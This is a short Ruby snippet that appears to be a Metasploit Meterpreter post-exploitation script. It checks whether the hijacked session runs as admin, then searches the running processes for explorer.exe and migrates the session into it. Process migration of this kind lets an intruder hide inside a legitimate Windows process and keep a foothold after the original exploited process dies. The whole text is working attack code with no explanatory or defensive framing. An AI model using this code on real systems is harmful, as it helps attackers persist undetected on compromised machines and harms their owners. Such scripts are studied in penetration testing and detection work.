admin_check = is_admin?
if(admin_check)
print_good("Current user is Admin")
else
print_error("Current user is not Admin")
end
session.sys.process.get_processes().each do |x|
if x['name'].downcase=="explorer.exe"
print_good("Explorer.exe is running with PID #{x['pid']}")
explorer_ppid = x['pid'].to_i
print_good("migrate to explorer.exe at PID #{explorer_ppid.to_s}")
session.core.migrate(explorer_ppid)
end
end

